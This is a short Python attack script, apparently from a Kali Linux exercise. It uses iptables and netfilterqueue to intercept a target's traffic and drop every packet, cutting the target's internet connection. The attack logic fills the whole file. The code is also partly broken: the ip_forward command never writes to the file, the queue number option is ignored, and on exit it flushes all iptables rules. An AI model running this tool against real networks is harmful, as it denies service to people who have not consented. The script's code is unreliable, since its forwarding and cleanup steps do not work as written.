#!/usr/bin/env python
import netfilterqueue
import subprocess
import optparse
import os


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-c", "--chain", dest="chain", help="adding the chain , e.g FORWARD,INPUT,OUTPUT")
    parser.add_option("-n", "--num", dest="num", help="queue num, e.g 0")
    (options, arguments) = parser.parse_args()
    if not options.chain:
        parser.error("[-] Pls specify a chain, use --help for more help")
    elif not options.num:
        parser.error("[-] Pls specify a queue num, use --help for more help")
    return options


def starting_up(chain, num):
    print("[+] Default chain packets are send through another interface")
    subprocess.call(["iptables", "-I", chain, "-j", "NFQUEUE", "--queue-num", num])
    # "Enable ip forwarding as Kali might not be processing incoming and outgoing packet like a normal router do "
    subprocess.call(["echo", "1", "/proc/sys/net/ipv4/ip_forward"], stdout=open(os.devnull, 'wb'))


def cutting_internet_connection_target(packet):
    print(packet)
    packet.drop()


def iptables_flush():
    print("[+] flushing iptables!!")
    subprocess.call(["iptables", "--flush"])


options = get_arguments()


try:
    starting_up(options.chain, options.num)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, cutting_internet_connection_target)
    queue.run()
except KeyboardInterrupt:
    iptables_flush()
